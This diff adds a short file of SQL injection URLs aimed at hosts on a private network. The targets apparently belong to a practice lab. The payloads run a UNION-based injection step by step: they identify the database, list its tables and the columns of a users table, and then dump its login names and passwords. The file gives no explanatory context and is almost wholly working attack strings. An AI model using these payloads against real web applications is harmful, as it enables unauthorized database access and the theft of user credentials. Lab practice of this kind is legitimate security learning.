@@ -1,0 +1,8 @@
+http://192.168.43.57/lab/?id=-1%27%20union%20select%201,database(),3--%20#
+
+
+192.168.43.206/cat.php?id=2 union select 1,group_concat(table_name),3,4--+
+http://192.168.43.206/cat.php?id=2%20union%20select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=database()--+
+http://192.168.43.206/cat.php?id=2%20union%20select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name=%27users%27--+
+http://192.168.43.206/cat.php?id=2%20union%20select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name=%27users%27--+
+http://192.168.43.206/cat.php?id=2%20union%20select%201,group_concat(login,%27%3Cbr%3E%27,password),3,4%20from%20users--+
